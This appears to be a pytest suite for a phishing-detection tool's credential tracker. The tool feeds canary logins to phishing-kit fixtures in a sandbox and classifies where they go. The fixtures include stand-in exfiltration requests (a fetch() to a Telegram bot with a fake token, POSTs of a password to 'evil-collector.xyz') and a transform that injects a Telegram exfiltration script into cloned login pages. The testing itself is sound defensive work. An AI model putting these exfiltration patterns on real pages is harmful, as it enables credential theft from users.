"""P9: the Credential Tracker (C14/C15), its kit fixtures and the hard rules H2-H4.

The first half needs no browser (canaries, request search, classification, redaction, evidence, fusion). The
browser half runs kits from the zoo and the gallery fixtures in the sandbox; it skips without Playwright.
"""

import json
import os
import re
import subprocess

import pytest

from doppel.address import read_address
from doppel.brain import fusion
from doppel.contract import REPO_ROOT, validate_evidence_item, validate_verdict
from doppel.deep import in_family_of
from doppel.deep import kits as K
from doppel.deep import pages as P
from doppel.deep import tracker as T
from doppel.deep.sandbox import backend_page
from doppel.family import load_registry

REG = load_registry()
BY_ID = {b.id: b for b in REG.brands}
FAM = lambda b, h: in_family_of(REG, b, h)     # noqa: E731
try:
    import playwright  # noqa: F401
    HAVE_PW = True
except ImportError:
    HAVE_PW = False
browser = pytest.mark.skipif(not HAVE_PW, reason="needs Playwright + Chromium")
snapshots = pytest.mark.skipif(not (HAVE_PW and P.references()), reason="needs Playwright + genuine snapshots")
os.environ["DOPPEL_OFFLINE"] = "1"


# ------------------------------------------------------------------ tokens and redaction ---

def test_fixture_token_looks_real_and_is_always_redacted():
    tok = P.fake_telegram_token("kx72-secure.top")
    assert T.TELEGRAM_TOKEN.fullmatch(tok)
    url = f"https://api.telegram.org/bot{tok}/sendMessage"
    red = T.redact(url)
    assert tok not in red and "****:[REDACTED]" in red and red.startswith("https://api.telegram.org/bot")
    assert T.tokens_in(url) == [tok[:5] + "****:[REDACTED]"]
    hook = "https://discord.com/api/webhooks/112233/AbCdEf-secret_part"
    assert T.redact(hook) == "https://discord.com/api/webhooks/112233/[REDACTED]"


def test_no_token_shaped_literal_is_committed():
    """Fixture tokens are built at runtime; a token-shaped string in a tracked file would trip secret scanners."""
    files = subprocess.run(["git", "ls-files"], cwd=REPO_ROOT, capture_output=True, text=True).stdout.split()
    hits = []
    for f in files:
        if not re.search(r"\.(py|ya?ml|html|json|md|ts|tsx)$", f):
            continue
        text = (REPO_ROOT / f).read_text(encoding="utf-8", errors="ignore")
        hits += [f for _ in T.TELEGRAM_TOKEN.finditer(text)]
    assert hits == []


@pytest.mark.parametrize("url,ch", [
    ("https://api.telegram.org/bot1/sendMessage", "telegram"),
    ("https://discord.com/api/webhooks/1/x", "discord"), ("https://discord.com/channels/1", None),
    ("https://docs.google.com/forms/d/e/x/formResponse", "google_forms"), ("https://docs.google.com/document/d/x", None),
    ("https://script.google.com/macros/s/x/exec", "google_forms"), ("https://webhook.site/abc", "relay"),
    ("https://formspree.io/f/x", "relay"), ("https://kx72-secure.top/auth.php", None),
])
def test_channels(url, ch):
    assert T.channel(url) == ch


# ------------------------------------------------------------------ canaries and search ---

def test_canaries_fit_the_field_and_cards_pass_luhn():
    import random

    rng = random.Random(1)
    card = T.canary("card_number", {}, rng, 0)
    assert len(card) == 16 and card.isdigit()
    total = sum(int(d) if k % 2 == 0 else (int(d) * 2 - 9 if int(d) * 2 > 9 else int(d) * 2)
                for k, d in enumerate(reversed(card)))
    assert total % 10 == 0
    assert T.canary("mobile_number", {"type": "tel"}, rng, 1)[0] == "9"
    assert len(T.canary("otp", {}, rng, 2)) == 6
    assert re.fullmatch(r"dpl[a-z2-9]{7}03", T.canary("password", {"type": "password"}, rng, 3))
    assert T.canary(None, {"type": "email"}, rng, 4).endswith("@example.com")
    assert re.fullmatch(r"\d\d/\d\d", T.canary("expiry", {}, rng, 5))


def test_plan_fill_picks_the_credential_form():
    found = {"forms": [{"f": 0, "action": "/search", "method": "get", "inputs": [{"i": 0, "type": "search", "name": "q"}]},
                       {"f": 1, "action": "/auth.php", "method": "post",
                        "inputs": [{"i": 1, "type": "", "name": "user"}, {"i": 2, "type": "password", "name": "p"},
                                   {"i": 3, "type": "", "name": "cvv"}]}], "loose": []}
    plan = T.plan_fill(found, "seed")
    assert plan["target"] == {"form": 1} and plan["form"]["fields"] == ["username", "password", "cvv"]
    assert [c["traceable"] for c in plan["canaries"]] == [True, True, False]       # a 3-digit CVV isn't searched
    assert T.plan_fill({"forms": found["forms"][:1], "loose": []}, "s") is None
    loose = T.plan_fill({"forms": [], "loose": [{"i": 0, "type": "password", "name": ""}]}, "s")
    assert loose["target"] == {"form": None}


@pytest.mark.parametrize("encode", [
    lambda v: f"pass={v}", lambda v: "d=" + __import__("urllib.parse").parse.quote(json.dumps({"p": v})),
    lambda v: __import__("base64").b64encode(json.dumps({"pass": v}).encode()).decode(),
    lambda v: "x=" + __import__("urllib.parse").parse.quote(__import__("urllib.parse").parse.quote(v + "&")),
    lambda v: v.upper(),
])
def test_canaries_are_found_plain_url_encoded_base64_and_any_case(encode):
    assert "dplabcdefg01" in T.haystack(encode("dplabcdefg01"))


def test_hex_is_not_decoded():
    assert "dplabcdefg01" not in T.haystack("dplabcdefg01".encode().hex())


# ------------------------------------------------------------------ outcomes (C15) ---

def _attempt(requests=(), posts=(), after=None, canaries=None, submitted=True, form=True):
    return {"submitted": submitted, "form": {"index": 0, "fields": ["username", "password"]} if form else None,
            "canaries": canaries if canaries is not None else
            [{"field": "username", "value": "dplaaaaaaa00", "traceable": True},
             {"field": "password", "value": "dplbbbbbbb01", "traceable": True}],
            "requests": list(requests), "sockets": [], "posts": list(posts), "after": after, "how": "submit_button",
            "sunk": 1, "refused": 1}


def _req(url, body="", t=1.0, top=False, method="POST", typ="fetch"):
    return {"t_ms": t, "url": url, "method": method, "type": typ, "top_nav": top, "body": body, "headers": {}}


POST_OWN = _req("https://kx.top/auth.php", "u=dplaaaaaaa00&p=dplbbbbbbb01", 2, True, "POST", "document")
BOUNCE = _req("https://sbi.bank.in/", "", 3, True, "GET", "document")
TG = _req("https://api.telegram.org/bot" + P.fake_telegram_token("t") + "/sendMessage", "text=dplbbbbbbb01", 1)


def test_outcome_states():
    acc = _attempt([POST_OWN, BOUNCE], [{"answered_by": "fixture_backend"}], {"url": "chrome-error://chromewebdata/"})
    assert T.outcome(acc, "kx.top")["state"] == "accepted" and T.outcome(acc, "kx.top")["bounce"] == "https://sbi.bank.in/"
    rej = _attempt([POST_OWN], [{"answered_by": "fixture_backend"}],
                   {"url": "https://kx.top/auth.php", "title": "Login", "text": "Invalid username or password", "password_fields": 1})
    assert T.outcome(rej, "kx.top")["state"] == "rejected"
    unk = _attempt([POST_OWN], [{"answered_by": "sandbox_placeholder"}], {"url": "https://kx.top/auth.php", "text": "Processing..."})
    assert T.outcome(unk, "kx.top")["state"] == "unknown"                 # the sandbox's own answer proves nothing
    assert T.outcome(_attempt(submitted=False), "kx.top")["state"] == "not_submitted"


# ------------------------------------------------------------------ evidence ---

def _session(*attempts, static=()):
    return {"url": "https://kx.top/", "host": "kx.top", "attempts": list(attempts), "static": list(static), "ms": 1234.5}


def _valid(items):
    assert [validate_evidence_item(i) for i in items] == [[] for _ in items]


def test_kit_to_telegram_and_own_server_accepting_anything():
    a1 = _attempt([TG, POST_OWN, BOUNCE], [{"answered_by": "fixture_backend"}], {"url": "chrome-error://x"})
    a2 = _attempt([TG, POST_OWN, BOUNCE], [{"answered_by": "fixture_backend"}], {"url": "chrome-error://x"})
    summary, items = T.credential_tracker(_session(a1, a2), "kx.top", "kx.top", BY_ID["sbi"], False, FAM)
    _valid(items)
    f = [i["finding"] for i in items]
    assert f == ["direct_exfil_telegram", "credentials_to_foreign_domain", "accepts_any_credentials", "redirects_to_real_brand"]
    tg = items[0]
    assert tg["details"]["token_redacted"].endswith("****:[REDACTED]") and tg["details"]["blocked_by_sandbox"] is True
    assert P.fake_telegram_token("t") not in json.dumps(items)                       # never stored
    own = items[1]["details"]["destinations"]
    assert [d["host"] for d in own] == ["api.telegram.org", "kx.top"] and own[1]["relation"] == "same_origin"
    assert items[1]["details"]["limitation"].startswith("Server-side exfiltration")
    assert items[0]["duration_ms"] >= 1234.5


def test_genuine_page_confirm_only_stays_in_family():
    req = _req("https://onlinesbi.sbi.bank.in/login", "u=dplaaaaaaa00&p=dplbbbbbbb01", 1, True, "POST", "document")
    _, items = T.credential_tracker(_session(_attempt([req])), "onlinesbi.sbi.bank.in", "sbi.bank.in", BY_ID["sbi"],
                                    True, FAM, confirm_only=True)
    _valid(items)
    assert [i["finding"] for i in items] == ["credentials_stay_in_family"] and items[0]["points_to"] == "genuine"
    assert items[0]["details"]["confirm_only"] is True


def test_form_target_fallback_when_no_value_travels():
    nav = _req("https://onlinesbi.sbi.bank.in/?", "", 1, True, "GET", "document")
    _, items = T.credential_tracker(_session(_attempt([nav])), "onlinesbi.sbi.bank.in", "sbi.bank.in", BY_ID["sbi"],
                                    True, FAM, confirm_only=True)
    assert items[0]["finding"] == "credentials_stay_in_family" and items[0]["strength"] == "medium"
    assert items[0]["details"]["basis"] == "form_target_only" and "form submits" in items[0]["summary"]


def test_no_brand_own_server_is_neutral_but_a_third_party_is_not():
    _, items = T.credential_tracker(_session(_attempt([POST_OWN])), "kx.top", "kx.top", None, False, FAM)
    assert items[0]["finding"] == "credentials_to_page_owner" and items[0]["points_to"] == "neutral"
    other = _req("https://collect.drop.xyz/p", "p=dplbbbbbbb01")
    _, items = T.credential_tracker(_session(_attempt([other])), "kx.top", "kx.top", None, False, FAM)
    assert items[0]["finding"] == "credentials_to_foreign_domain" and items[0]["strength"] == "medium"


def test_relay_platforms_are_named():
    relay = _req("https://relay-1.zoo.workers.dev/c", '{"p":"dplbbbbbbb01"}')
    _, items = T.credential_tracker(_session(_attempt([relay])), "kx.top", "kx.top", BY_ID["sbi"], False, FAM)
    assert "free-hosting relay on workers.dev" in items[0]["summary"]


def test_nothing_to_submit_and_nothing_sent():
    _, items = T.credential_tracker(_session(_attempt(form=False)), "b.com", "b.com", None, False, FAM)
    assert [i["finding"] for i in items] == ["no_credential_form"]
    _, items = T.credential_tracker(_session(_attempt([_req("https://b.com/x.js", "", typ="script", method="GET")])),
                                    "b.com", "b.com", BY_ID["sbi"], False, FAM)
    assert [i["finding"] for i in items] == ["no_credentials_sent"]


def test_static_indicators_are_redacted():
    html = "<script>fetch('https://api.telegram.org/bot" + P.fake_telegram_token("s") + "/sendMessage')</script>"
    ind = T.static_indicators(html)
    assert ind and "REDACTED" in ind[0] and P.fake_telegram_token("s") not in ind[0]


# ------------------------------------------------------------------ hard rules ---

def _ev(eid, finding, points="phishing"):
    return {"evidence_id": eid, "finding": finding, "points_to": points}


def test_hard_rules_priority_and_never_on_genuine():
    ev = [_ev("E1", "claimed_brand_mismatch"), _ev("E2", "direct_exfil_telegram"),
          _ev("E3", "credentials_to_foreign_domain"), _ev("E4", "accepts_any_credentials")]
    fired = fusion.hard_rules(ev, genuine=False)
    assert [r for r, _ in fired] == ["H2_brand_claim_foreign_credentials", "H3_accepts_any_credentials",
                                     "H4_direct_exfil_channel"]
    assert fired[0][1] == ["E1", "E2", "E3"]
    assert fusion.hard_rules(ev[1:3], genuine=False)[0][0] == "H4_direct_exfil_channel"   # no claim: no H2
    assert fusion.hard_rules(ev, genuine=True) == []
    assert [e["evidence_id"] for e in fusion.leaves_family(ev)] == ["E2", "E3"]


# ------------------------------------------------------------------ fixtures ---

def test_kit_transforms_name_inputs_and_add_the_telegram_script():
    html = '<html><body><form><input id="mat-input-1"><input type="password" id="x"><input type="hidden" id="h"></form></body></html>'
    out, log = P.apply(html, [{"kind": "name_inputs"}, {"kind": "exfil_script", "channel": "telegram"}], "kx.top")
    assert 'name="mat-input-1"' in out and 'name="password"' in out and 'type="hidden" id="h"' in out
    assert "api.telegram.org" in out and log[0]["named"] == ["mat-input-1", "password"]
    with pytest.raises(ValueError):
        P.apply(html, [{"kind": "exfil_script", "channel": "pigeon"}], "x")


def test_fixture_backends():
    assert P.sites()["kx72-secure.top"]["backend"] == {"accepts": "any", "then": "https://sbi.bank.in/"}
    assert backend_page(None)[1] == "sandbox_placeholder"
    body, by = backend_page({"accepts": "any", "then": "https://paytm.com/"})
    assert by == "fixture_backend" and 'url=https://paytm.com/' in body
    assert "Invalid" in backend_page({"accepts": "none"})[0]
    with pytest.raises(ValueError):
        backend_page({"accepts": "maybe"})


def test_zoo_is_well_formed():
    z = K.zoo()
    assert len({k["name"] for k in z}) == len(z) and all(k["host"].endswith(K.ZOO_DOMAIN) for k in z)
    assert {k["name"] for k in z if k["miss"]} == {"server_side_mail", "hex_body"}


# ------------------------------------------------------------------ browser ---

@pytest.fixture(scope="module")
def sb():
    from doppel.deep.sandbox import sandbox

    return sandbox()


def _run(sb, name):
    k = K.by_name(name)
    s = sb.track_html(k["host"], k["html"], k["backend"])
    summary, items = T.credential_tracker(s, k["host"], read_address(k["host"]).owner, BY_ID["sbi"], False, FAM)
    _valid(items)
    return k, s, summary, [i["finding"] for i in items]


@browser
@pytest.mark.parametrize("name", ["fetch_telegram", "xhr_discord", "websocket", "beacon", "base64_body", "keylogger",
                                  "no_form_button", "form_get_foreign"])
def test_zoo_destinations_are_found(sb, name):
    k, s, summary, findings = _run(sb, name)
    assert set(k["expect_hosts"]) <= {d["host"] for d in summary["destinations"]}
    if k["expect_channel"]:
        assert f"direct_exfil_{k['expect_channel']}" in findings
    assert len(s["attempts"]) == 1                       # no backend answer: C15 can't be tested, one session only


@browser
def test_zoo_accepts_any_and_bounces(sb):
    _, s, _, findings = _run(sb, "accepts_any_bounce")
    assert len(s["attempts"]) == 2
    assert s["attempts"][0]["canaries"][0]["value"] != s["attempts"][1]["canaries"][0]["value"]   # two different logins
    assert {"accepts_any_credentials", "redirects_to_real_brand"} <= set(findings)


@browser
def test_zoo_rejecting_login_and_the_expected_hex_miss(sb):
    assert "rejects_wrong_credentials" in _run(sb, "rejects")[3]
    assert _run(sb, "hex_body")[3] == ["no_credentials_sent"]


@browser
def test_sink_answers_locally_and_off_page_navigations_are_refused(sb):
    k = K.by_name("accepts_any_bounce")
    s = sb.track_html(k["host"], k["html"], k["backend"], attempts=1)
    a = s["attempts"][0]
    nav = [r for r in a["requests"] if r["top_nav"] and "onlinesbi" in r["url"]]
    assert nav and (a["after"] is None or a["after"]["url"].startswith("chrome-error"))   # refused, never loaded
    k = K.by_name("fetch_telegram")
    a = sb.track_html(k["host"], k["html"], None, attempts=1)["attempts"][0]
    assert a["sunk"] >= 1                                                    # answered by the sink, not the network


@snapshots
def test_brain_kit_clone_fires_h2_h3_h4():
    from doppel.brain.brain import Brain

    v = Brain().investigate("kx72-secure.top", "gallery")
    assert validate_verdict(v) == []
    assert v["label"] == "phishing" and v["stages"][2]["tools"] == ["page_inspector", "vision_ai", "credential_tracker"]
    hr = v["hard_rule"]
    assert hr["id"] == "H2_brand_claim_foreign_credentials"
    assert hr["also_fired"] == ["H3_accepts_any_credentials", "H4_direct_exfil_channel"]
    assert "Telegram" in v["reason"] and "accepts any password" in v["reason"]
    assert P.fake_telegram_token("kx72-secure.top") not in json.dumps(v, ensure_ascii=False)
    assert not any("arrives in P9" in s["message"] for s in v["trace"])


@snapshots
def test_brain_genuine_login_stays_in_family_for_h1():
    from doppel.brain.brain import Brain

    v = Brain().investigate("onlinesbi.sbi.bank.in", "gallery")
    assert validate_verdict(v) == [] and v["label"] == "genuine"
    stay = next(e for e in v["evidence"] if e["finding"] == "credentials_stay_in_family")
    assert stay["evidence_id"] in v["hard_rule"]["evidence_ids"] and stay["details"]["confirm_only"]
    assert not any(e["criterion"] == "C15" for e in v["evidence"])          # never test logins on a genuine site


@snapshots
def test_brain_genuine_page_leaking_credentials_is_needs_review(monkeypatch):
    """A proven address whose login sends the password outside the family: compromised, not 'genuine', not blocked."""
    from doppel.brain.brain import Brain
    from doppel.deep.sandbox import Sandbox

    leak = _attempt([_req("https://evil-collector.xyz/c", "p=dplbbbbbbb01")])
    monkeypatch.setattr(Sandbox, "track_fixture", lambda self, host, attempts=2: _session(leak))
    v = Brain().investigate("onlinesbi.sbi.bank.in", "gallery")
    assert validate_verdict(v) == []
    assert v["label"] == "needs_review" and v["hard_rule"] is None
    assert "evil-collector.xyz" in v["reason"] and "possibly compromised" in v["reason"]
